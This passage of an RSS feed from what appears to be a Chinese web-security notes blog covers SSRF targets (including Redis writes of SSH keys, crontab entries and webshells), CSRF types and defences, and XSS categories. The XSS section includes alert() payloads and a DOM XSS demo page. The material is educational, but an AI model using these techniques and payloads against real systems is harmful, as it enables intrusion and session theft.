&lt;h1 id=&#34;可能的利用点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#可能的利用点&#34;&gt;#&lt;/a&gt; 可能的利用点&lt;/h1&gt;
&lt;h2 id=&#34;内网服务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#内网服务&#34;&gt;#&lt;/a&gt; 内网服务&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Apache Hadoop 远程命令执行&lt;/li&gt;
&lt;li&gt;axis2-admin 部署 Server 命令执行&lt;/li&gt;
&lt;li&gt;Confluence SSRF&lt;/li&gt;
&lt;li&gt;counchdb WEB API 远程命令执行&lt;/li&gt;
&lt;li&gt;dict&lt;/li&gt;
&lt;li&gt;docker API 远程命令执行&lt;/li&gt;
&lt;li&gt;Elasticsearch 引擎 Groovy 脚本命令执行&lt;/li&gt;
&lt;li&gt;ftp /ftps（FTP 爆破）&lt;/li&gt;
&lt;li&gt;glassfish 任意文件读取和 war 文件部署间接命令执行&lt;/li&gt;
&lt;li&gt;gopher&lt;/li&gt;
&lt;li&gt;HFS 远程命令执行&lt;/li&gt;
&lt;li&gt;http、https&lt;/li&gt;
&lt;li&gt;imap/imaps/pop3/pop3s/smtp/smtps（爆破邮件用户名密码）&lt;/li&gt;
&lt;li&gt;Java 调试接口命令执行&lt;/li&gt;
&lt;li&gt;JBOSS 远程 Invoker war 命令执行&lt;/li&gt;
&lt;li&gt;Jenkins Scripts 接口命令执行&lt;/li&gt;
&lt;li&gt;ldap&lt;/li&gt;
&lt;li&gt;mongodb&lt;/li&gt;
&lt;li&gt;php_fpm/fastcgi 命令执行&lt;/li&gt;
&lt;li&gt;rtsp - smb/smbs（连接 SMB）&lt;/li&gt;
&lt;li&gt;sftp&lt;/li&gt;
&lt;li&gt;ShellShock 命令执行&lt;/li&gt;
&lt;li&gt;Struts2 命令执行&lt;/li&gt;
&lt;li&gt;telnet&lt;/li&gt;
&lt;li&gt;tftp（UDP 协议扩展）&lt;/li&gt;
&lt;li&gt;tomcat 命令执行&lt;/li&gt;
&lt;li&gt;WebDav PUT 上传任意文件&lt;/li&gt;
&lt;li&gt;WebSphere Admin 可部署 war 间接命令执行&lt;/li&gt;
&lt;li&gt;zentoPMS 远程命令执行&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;redis利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#redis利用&#34;&gt;#&lt;/a&gt; Redis 利用&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;写 ssh 公钥&lt;/li&gt;
&lt;li&gt;写 crontab&lt;/li&gt;
&lt;li&gt;写 WebShell&lt;/li&gt;
&lt;li&gt;Windows 写启动项&lt;/li&gt;
&lt;li&gt;主从复制加载 .so 文件&lt;/li&gt;
&lt;li&gt;主从复制写无损文件&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;云主机&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#云主机&#34;&gt;#&lt;/a&gt; 云主机&lt;/h2&gt;
&lt;p&gt;在 AWS、Google 等云环境下，通过访问云环境的元数据 API 或管理 API，在部分情况下可以实现敏感信息等效果。&lt;/p&gt;
&lt;h1 id=&#34;防御方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御方式&#34;&gt;#&lt;/a&gt; 防御方式&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;过滤返回的信息&lt;/li&gt;
&lt;li&gt;统一错误信息&lt;/li&gt;
&lt;li&gt;限制请求的端口&lt;/li&gt;
&lt;li&gt;禁止不常用的协议&lt;/li&gt;
&lt;li&gt;对 DNS Rebinding，考虑使用 DNS 缓存或者 Host 白名单&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy45MXJpLm9yZy8xNzExMS5odG1s&#34;&gt;SSRF 漏洞分析与利用&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYmxhY2toYXQuY29tL2RvY3MvdXMtMTcvdGh1cnNkYXkvdXMtMTctVHNhaS1BLU5ldy1FcmEtT2YtU1NSRi1FeHBsb2l0aW5nLVVSTC1QYXJzZXItSW4tVHJlbmRpbmctUHJvZ3JhbW1pbmctTGFuZ3VhZ2VzLnBkZg==&#34;&gt;A New Era Of SSRF&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tZWRpdW0uY29tL3NlY2p1aWNlL3BocC1zc3JmLXRlY2huaXF1ZXMtOWQ0MjJjYjI4ZDUx&#34;&gt;php ssrf technique&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUFlUSE9OL2RlZmVuZC1zc3JmLXZ1bG5lcmFibGUtaW4tcHl0aG9uLmh0bWw=&#34;&gt;谈一谈如何在 Python 开发中拒绝 SSRF 漏洞&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Jsb2cuc2FmZWJ1ZmYuY29tLzIwMTYvMDcvMDMvU1NSRi1UaXBzLw==&#34;&gt;SSRF Tips&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9qb3ljaG91Lm9yZy93ZWIvcGhwc3NyZi5odG1s&#34;&gt;SSRF in PHP&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/CSRF/</guid>
            <title>CSRF</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/CSRF/</link>
            <category>网络安全</category>
            <category>漏洞</category>
            <category>CSRF</category>
            <pubDate>Sat, 26 Nov 2022 16:58:44 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
&lt;p&gt;跨站请求伪造 (Cross-Site Request Forgery, CSRF)，也被称为 One Click Attack 或者 Session Riding ，通常缩写为 CSRF，是一种对网站的恶意利用。尽管听起来像 XSS，但它与 XSS 非常不同，XSS 利用站点内的信任用户，而 CSRF 则通过伪装来自受信任用户的请求来利用受信任的网站。&lt;/p&gt;
&lt;h1 id=&#34;分类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#分类&#34;&gt;#&lt;/a&gt; 分类&lt;/h1&gt;
&lt;h2 id=&#34;资源包含&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#资源包含&#34;&gt;#&lt;/a&gt; 资源包含&lt;/h2&gt;
&lt;p&gt;资源包含是在大多数介绍 CSRF 概念的演示或基础课程中可能看到的类型。这种类型归结为控制 HTML 标签（例如 &amp;lt;image&amp;gt;、&amp;lt;audio&amp;gt;、&amp;lt;video&amp;gt;、&amp;lt;object&amp;gt;、&amp;lt;script &amp;gt; 等）所包含的资源的攻击者。如果攻击者能够影响 URL 被加载的话，包含远程资源的任何标签都可以完成攻击。&lt;/p&gt;
&lt;p&gt;由于缺少对 Cookie 的源点检查，如上所述，此攻击不需要 XSS，可以由任何攻击者控制的站点或站点本身执行。此类型仅限于 GET 请求，因为这些是浏览器对资源 URL 唯一的请求类型。这种类型的主要限制是它需要错误地使用安全的 HTTP 请求方式。&lt;/p&gt;
&lt;h2 id=&#34;基于表单&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基于表单&#34;&gt;#&lt;/a&gt; 基于表单&lt;/h2&gt;
&lt;p&gt;通常在正确使用安全的请求方式时看到。攻击者创建一个想要受害者提交的表单；其包含一个 JavaScript 片段，强制受害者的浏览器提交。&lt;/p&gt;
&lt;p&gt;该表单可以完全由隐藏的元素组成，以致受害者很难发现它。&lt;/p&gt;
&lt;p&gt;如果处理 cookies 不当，攻击者可以在任何站点上发动攻击，只要受害者使用有效的 cookie 登录，攻击就会成功。如果请求是有目的性的，成功的攻击将使受害者回到他们平时正常的页面。该方法对于攻击者可以将受害者指向特定页面的网络钓鱼攻击特别有效。&lt;/p&gt;
&lt;h2 id=&#34;xmlhttprequest&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xmlhttprequest&#34;&gt;#&lt;/a&gt; XMLHttpRequest&lt;/h2&gt;
&lt;p&gt;XMLHttpRequest 可能是最少看到的方式，由于许多现代 Web 应用程序依赖 XHR，许多应用花费大量的时间来构建和实现这一特定的对策。&lt;/p&gt;
&lt;p&gt;基于 XHR 的 CSRF 通常由于 SOP 而以 XSS 有效载荷的形式出现。没有跨域资源共享策略 (Cross-Origin Resource Sharing, CORS)，XHR 仅限于攻击者托管自己的有效载荷的原始请求。&lt;/p&gt;
&lt;p&gt;这种类型的 CSRF 的攻击有效载荷基本上是一个标准的 XHR，攻击者已经找到了一些注入受害者浏览器 DOM 的方式。&lt;/p&gt;
&lt;h1 id=&#34;防御&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御&#34;&gt;#&lt;/a&gt; 防御&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;通过 CSRF-token 或者验证码来检测用户提交&lt;/li&gt;
&lt;li&gt;验证 Referer/Content-Type&lt;/li&gt;
&lt;li&gt;对于用户修改删除等操作最好都使用 POST 操作&lt;/li&gt;
&lt;li&gt;避免全站通用的 Cookie，严格设置 Cookie 的域&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZ2l0aHViLmNvbS9qcm96bmVyL2NzcmYtZGVtbw==&#34;&gt;demo&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tZWRpdW0uY29tL0Bqcm96bmVyL3dpcGluZy1vdXQtY3NyZi1kZWQ5N2FlN2U4M2Y=&#34;&gt;Wiping Out CSRF&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvMGFuZzNlbC9uZWF0LXRyaWNrcy10by1ieXBhc3MtY3NyZnByb3RlY3Rpb24=&#34;&gt;Neat tricks to bypass CSRF protection&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/XSS/</guid>
            <title>XSS</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/XSS/</link>
            <category>网络安全</category>
            <category>XSS</category>
            <category>漏洞</category>
            <pubDate>Sat, 26 Nov 2022 11:55:09 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;分类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#分类&#34;&gt;#&lt;/a&gt; 分类&lt;/h1&gt;
&lt;h2 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
&lt;p&gt;XSS 全称为 Cross Site Scripting，为了和 CSS 分开简写为 XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了不在预期过程中的 JavaScript 代码执行。XSS 通常被用于获取 Cookie、以受攻击者的身份进行操作等行为。&lt;/p&gt;
&lt;h2 id=&#34;反射型xss&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反射型xss&#34;&gt;#&lt;/a&gt; 反射型 XSS&lt;/h2&gt;
&lt;p&gt;反射型 XSS 是比较常见和广泛的一类，举例来说，当一个网站的代码中包含类似下面的语句： &lt;code&gt;&amp;lt;?php echo &amp;quot;&amp;lt;p&amp;gt;hello, $_GET[&#39;user&#39;]&amp;lt;/p&amp;gt;&amp;quot;;?&amp;gt;&lt;/code&gt;  ，那么在访问时设置  &lt;code&gt;/?user=&amp;lt;/p&amp;gt;&amp;lt;script&amp;gt;alert(&amp;quot;hack&amp;quot;)&amp;lt;/script&amp;gt;&amp;lt;p&amp;gt;&lt;/code&gt;  ，则可执行预设好的 JavaScript 代码。&lt;/p&gt;
&lt;p&gt;反射型 XSS 通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到 XSS Auditor、NoScript 等防御手段的影响较大。&lt;/p&gt;
&lt;h2 id=&#34;储存型xss&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#储存型xss&#34;&gt;#&lt;/a&gt; 储存型 XSS&lt;/h2&gt;
&lt;p&gt;储存型 XSS 相比反射型来说危害较大，在这种漏洞中，攻击者能够把攻击载荷存入服务器的数据库中，造成持久化的攻击。&lt;/p&gt;
&lt;h2 id=&#34;dom-xss&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dom-xss&#34;&gt;#&lt;/a&gt; DOM XSS&lt;/h2&gt;
&lt;p&gt;DOM 型 XSS 不同之处在于 DOM 型 XSS 一般和服务器的解析响应没有直接关系，而是在 JavaScript 脚本动态执行的过程中产生的。&lt;/p&gt;
&lt;p&gt;例如&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption data-lang=&#34;HTML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;html&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;head&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;title&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;DOM Based XSS Demo&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;title&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token script&#34;&gt;&lt;span class=&#34;token language-javascript&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;xsstest&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; str &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; document&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getElementById&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;input&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;value&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    document&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getElementById&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;output&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;innerHTML &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&amp;lt;img src=&#39;&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;str&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&#39;&gt;&amp;lt;/img&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;script&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;head&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;body&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;div&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;output&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;div&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;input&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;text&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;input&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;50&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;input&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;button&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;submit&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token special-attr&#34;&gt;&lt;span class=&#34;token attr-name&#34;&gt;onclick&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token value javascript language-javascript&#34;&gt;&lt;span class=&#34;token function&#34;&gt;xsstest&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;body&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;html&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;输入  &lt;code&gt;x&#39; onerror=&#39;javascript:alert(/xss/)&lt;/code&gt;  即可触发。&lt;/p&gt;
&lt;h2 id=&#34;blind-xss&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#blind-xss&#34;&gt;#&lt;/a&gt; Blind XSS&lt;/h2&gt;
&lt;p&gt;Blind XSS 是储存型 XSS 的一种，它保存在某些存储中，当一个 “受害者” 访问这个页面时执行，并且在文档对象模型 (DOM) 中呈现 payload。 它被称为 Blind 的原因是因为它通常发生在通常不暴露给用户的功能上。&lt;/p&gt;
&lt;h1 id=&#34;危害&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#危害&#34;&gt;#&lt;/a&gt; 危害&lt;/h1&gt;
&lt;p&gt;存在 XSS 漏洞时，可能会导致以下几种情况：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;用户的 Cookie 被获取，其中可能存在 Session ID 等敏感信息。若服务器端没有做相应防护，攻击者可用对应 Cookie 登陆服务器。&lt;/li&gt;
&lt;li&gt;攻击者能够在一定限度内记录用户的键盘输入。&lt;/li&gt;
&lt;li&gt;攻击者通过 CSRF 等方式以用户身份执行危险操作。&lt;/li&gt;
&lt;li&gt;XSS 蠕虫。&lt;/li&gt;
&lt;li&gt;获取用户浏览器信息。&lt;/li&gt;
&lt;li&gt;利用 XSS 漏洞扫描用户内网。&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;同源策略&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#同源策略&#34;&gt;#&lt;/a&gt; 同源策略&lt;/h1&gt;
&lt;h2 id=&#34;简介-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-2&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
&lt;p&gt;同源策略限制了不同源之间如何进行资源交互，是用于隔离潜在恶意文件的重要安全机制。 是否同源由 URL 决定，URL 由协议、域名、端口和路径组成，如果两个 URL 的协议、域名和端口相同，则表示他们同源。&lt;/p&gt;
&lt;h3 id=&#34;file域的同源策略&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#file域的同源策略&#34;&gt;#&lt;/a&gt; file 域的同源策略&lt;/h3&gt;
&lt;p&gt;在之前的浏览器中，任意两个 file 域的 URI 被认为是同源的。本地磁盘上的任何 HTML 文件都可以读取本地磁盘上的任何其他文件。&lt;/p&gt;
&lt;p&gt;从 Gecko 1.9 开始，文件使用了更细致的同源策略，只有当源文件的父目录是目标文件的祖先目录时，文件才能读取另一个文件。&lt;/p&gt;
&lt;h3 id=&#34;cookie的同源策略&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cookie的同源策略&#34;&gt;#&lt;/a&gt; cookie 的同源策略&lt;/h3&gt;
&lt;p&gt;cookie 使用不同的源定义方式，一个页面可以为本域和任何父域设置 cookie，只要是父域不是公共后缀 (public suffix) 即可。&lt;/p&gt;
